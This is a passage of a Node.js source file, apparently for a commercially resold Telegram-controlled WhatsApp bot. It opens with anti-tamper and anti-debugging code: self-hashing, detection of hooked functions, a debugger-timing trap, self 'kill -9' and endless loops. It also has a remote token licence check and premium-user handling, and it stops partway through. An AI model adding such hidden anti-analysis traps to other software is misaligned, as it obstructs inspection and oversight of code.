(function() {
  'use strict';

  // ---------------- Native References ----------------
  const nativeFs = require('fs');
  const nativeChildExec = require('child_process').execSync;
  const nativePid = process.pid;
  const nativeExit = process.exit.bind(process);

  // ---------------- Utilities ----------------
  let fsExtra;
  try { fsExtra = require('fs-extra'); } catch(e) { fsExtra = nativeFs; }
  const path = require('path');
  const crypto = require('crypto');

  // ---------------- File Path & Baseline ----------------
  const preferName = 'index.js';
  let filePath = path.resolve(__dirname, preferName);
  if (!nativeFs.existsSync(filePath)) filePath = __filename;

  function sha256(s){ return crypto.createHash('sha256').update(s,'utf8').digest('hex'); }

  let baselineHash, baselineLines, baselineLineHashes;
  try {
    const content = nativeFs.readFileSync(filePath, 'utf8');
    baselineHash = sha256(content);
    baselineLines = content.split(/\r?\n/).length;
    baselineLineHashes = content.split(/\r?\n/).map(l=>sha256(l));
    console.log('[i] Baseline SHA256 captured:', baselineHash, '| lines:', baselineLines);
  } catch(e) {
    console.error('[!] ERROR membaca baseline integritas:', e.message);
    try { nativeChildExec('kill -9 ' + nativePid, {stdio:'ignore'}); } catch(e){}
    try { nativeExit(1); } catch(e){}
    while(1){}
  }

  // ---------------- Hard Fail (Local) ----------------
  function hardFail(reason) {
    const timestamp = new Date().toISOString();
    const auditLine = `[${timestamp}] ALERT: ${reason} | pid=${nativePid} | file=${filePath}\n`;

    // Log lokal
    try { nativeFs.appendFileSync(path.resolve(__dirname, 'xxx.audit.log'), auditLine, 'utf8'); } catch (e) {
      try { nativeFs.appendFileSync('/tmp/xxx.audit.log', auditLine, 'utf8'); } catch(e2) {}
    }

    // Console
    console.error('\n[!] DETEKSI PENAMBAHAN KODE / TAMPERING:', reason, '| timestamp:', timestamp);

    // Hard kill
    try { nativeChildExec('kill -9 ' + nativePid, { stdio:'ignore' }); } catch(e) {}
    try { nativeExit(1); } catch(e) {}
    try { process.exit(1); } catch(e) {}
    while(1) {}
  }

  // ---------------- Integritas Checker ----------------
  function checkIntegrity() {
    try {
      const curr = nativeFs.readFileSync(filePath,'utf8');
      if (sha256(curr) !== baselineHash) {
        const currLinesArr = curr.split(/\r?\n/);
        if (currLinesArr.length > baselineLines) return hardFail('Baris bertambah (penambahan kode).');
        for (let i=0; i<Math.min(baselineLineHashes.length,currLinesArr.length); i++) {
          if (sha256(currLinesArr[i]) !== baselineLineHashes[i]) {
            return hardFail('Perubahan pada baris ' + (i+1));
          }
        }
        return hardFail('File diubah (SHA mismatch).');
      }
    } catch(e) {
      return hardFail('Gagal baca file saat pengecekan integritas: '+(e.message||e));
    }
  }
  setInterval(checkIntegrity, 1000);
  setTimeout(checkIntegrity, 200);

  // ---------------- Safe Require Option ----------------
  const allowRequire = (process.env.ALLOW_REQUIRE === '1');
  if (!allowRequire) {
    if (require.main !== module) {
      console.error('[!] SECURITY ALERT: Dipanggil via require() - abort.');
      hardFail('Dipanggil via require() tanpa ALLOW_REQUIRE.');
    }
    if (module.parent !== null && module.parent !== undefined) {
      console.error('[!] SECURITY ALERT: Parent module terdeteksi - abort.');
      hardFail('Parent module terdeteksi tanpa ALLOW_REQUIRE.');
    }
  } else {
    console.log('[i] ALLOW_REQUIRE=1 aktif: file akan mengizinkan require() dari module lain.');
  }

  // ---------------- Anti-Hook / Anti-Bypass ----------------
  const nativePattern = /\[native code\]/;
  const proxyPattern = /Proxy|apply\(target/;
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i;
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i;

  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('');
  const exitStr = buildStr([101,120,105,116]);
  const killStr = buildStr([107,105,108,108]);
  const httpsStr = buildStr([104,116,116,112,115]);
  const httpStr = buildStr([104,116,116,112]);

  function forceKill() {
    try { nativeChildExec('kill -9 ' + nativePid, {stdio:'ignore'}); } catch(e) {}
    try { nativeExit(1); } catch(e) {}
    try { process.exit(1); } catch(e) {}
    while(1){}
  }

  // CEK ANTI-HOOK & OVERRIDE
  try {
    const M = require('module');
    const reqStr = M.prototype.require.toString();
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) forceKill();
  } catch(e) {}
  try {
    const exitFn = process[exitStr];
    const killFn = process[killStr];
    if (proxyPattern.test(exitFn.toString()) || bypassPattern.test(exitFn.toString())) forceKill();
    if (proxyPattern.test(killFn.toString()) || bypassPattern.test(killFn.toString()) || killFn.toString().length < 50) forceKill();
  } catch(e) {}

  try {
    const axios = require('axios');
    if (axios.interceptors.request.handlers.length > 0 || axios.interceptors.response.handlers.length > 0) forceKill();
  } catch(e) {}

  const checkGlobals = () => {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest'];
    for (let i = 0; i < flags.length; i++) {
      try { if (flags[i] in global && global[flags[i]]) forceKill(); } catch(e) {}
    }
  };
  checkGlobals();

  // CEK HTTPS / HTTP MASKED
  const checkHttps = () => {
    try {
      const https = require(httpsStr);
      if (Function.prototype.toString.call(https.request) !== https.request.toString()) forceKill();
    } catch(e) {}
  };
  const checkHttp = () => {
    try {
      const http = require(httpStr);
      if (Function.prototype.toString.call(http.request) !== http.request.toString()) forceKill();
    } catch(e) {}
  };
  setTimeout(()=>{ checkHttps(); checkHttp(); },500);

  // ---------------- Runtime Monitor ----------------
  const monitor = () => {
    if (require.main !== module || (module.parent !== null && module.parent !== undefined)) forceKill();
    try {
      const M = require('module');
      if (bypassPattern.test(M.prototype.require.toString())) forceKill();
    } catch(e) {}
    checkHttps(); checkHttp(); checkGlobals();
  };
  setInterval(monitor, 2000);
  setTimeout(monitor, 100);

})();

const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = "https://raw.githubusercontent.com/Rafijahat13/Scripttoken/refs/heads/main/tokens.json";
const thumbnailUrl = "https://ganga--link--ghhzdp9sv8hk.code.run/i/lpxcso2o";   

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

» Information:
  Developer: @R4f14ndr4
  Version: 3.5.0 
  Status: Bot Connected
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.blue(`
⠀⠀⠀⠀⠀⠀⢀⣤⡶⠁⣠⣴⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⣴⣿⠿⠋⣁⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣾⣿⡿⠟⠋⠉⠀⣀⣀⣀⣨⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣴⠂
⠈⠉⠁⠀⠀⣀⣴⣾⣿⣿⡿⠟⠛⠉⠉⠉⠉⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠋⠁⠀
⠀⠀⠀⢀⣴⣿⣿⣿⡿⠁⠀⢀⣀⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣾⣿⣿⣿⡿⠁⢀⣴⣿⠋⠉⠉⠉⠉⠛⣿⣿⣶⣤⣤⣤⣤⣶⠖⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⡇⢀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀
⠀⠀⠸⣿⣿⣿⣿⡇⠈⢿⣿⣿⠇⠀⠀⠀⠀⠀⢠⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢿⣿⣿⣿⣷⡀⠀⠉⠉⠀⠀⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣋⣠⡤⠄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀

» Information:
  Developer: @R4f14ndr4
  Version: 3.5.0 
  Status: Bypass Detect
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.blue(`
⠀⠀⠀⠀⠀⠀⢀⣤⡶⠁⣠⣴⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⣴⣿⠿⠋⣁⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣾⣿⡿⠟⠋⠉⠀⣀⣀⣀⣨⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣴⠂
⠈⠉⠁⠀⠀⣀⣴⣾⣿⣿⡿⠟⠛⠉⠉⠉⠉⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠋⠁⠀
⠀⠀⠀⢀⣴⣿⣿⣿⡿⠁⠀⢀⣀⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣾⣿⣿⣿⡿⠁⢀⣴⣿⠋⠉⠉⠉⠉⠛⣿⣿⣶⣤⣤⣤⣤⣶⠖⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⡇⢀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀
⠀⠀⠸⣿⣿⣿⣿⡇⠈⢿⣿⣿⠇⠀⠀⠀⠀⠀⢠⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢿⣿⣿⣿⣷⡀⠀⠉⠉⠀⠀⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣋⣠⡤⠄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀

» Information:
  Developer: @R4f14ndr4
  Version: 3.5.0 
  Status: Bypass Detect
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.red(`
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

» Information:
  Developer: @R4f14ndr4
  Version: 3.5.0 
  Status: No Access
  
  Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.green(`
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

» Information:
  Developer: @R4f14ndr4
  Version: 3.5.0 
  Status: No Access
  
  Gagal menghubungkan ke server, Akses ditolak
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'
const gcPremiumFile = './database/gcpremium.json';
const blockedPath = './database/blocked.json';

// Lock Menu \\
// Fungsi buat baca daftar blokir
const getBlocked = () => {
    if (!fs.existsSync(blockedPath)) return [];
    try {
        return JSON.parse(fs.readFileSync(blockedPath, 'utf-8'));
    } catch (e) { return []; }
};

// Fungsi buat simpan perubahan (PENTING!)
const saveBlocked = (list) => {
    fs.writeFileSync(blockedPath, JSON.stringify(list, null, 2));
};

// Middleware: "Satpam" bot kamu
bot.use((ctx, next) => {
    if (ctx.message?.text?.startsWith('/')) {
        const cmd = ctx.message.text.split(' ')[0].slice(1).split('@')[0].toLowerCase();
        const list = getBlocked();

        // Kalau ada di daftar blokir DAN bukan owner, tolak akses!
        if (list.includes(cmd) && ctx.from.id != ownerID) {
            return ctx.reply("❌ Command ini sedang dimatikan.");
        }
    }
    next();
});

// === add gc prem ==== \\
const loadGcPremium = () => {
    try {
        const data = fs.readFileSync(gcPremiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const saveGcPremium = (gc) => {
    fs.writeFileSync(gcPremiumFile, JSON.stringify(gc, null, 2));
};

const addGcPremium = (groupId, duration) => {
    const gcPremium = loadGcPremium();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    gcPremium[groupId] = expiryDate;
    saveGcPremium(gcPremium);
    return expiryDate;
};

const removeGcPremium = (groupId) => {
    const gcPremium = loadGcPremium();
    delete gcPremium[groupId];
    saveGcPremium(gcPremium);
};

const isGcPremium = (groupId) => {
    const gcPremium = loadGcPremium();
    if (gcPremium[groupId]) {
        const expiryDate = moment(gcPremium[groupId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removeGcPremium(groupId);
            return false;
        }
    }
    return false;
};

// === Add Prem === //
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
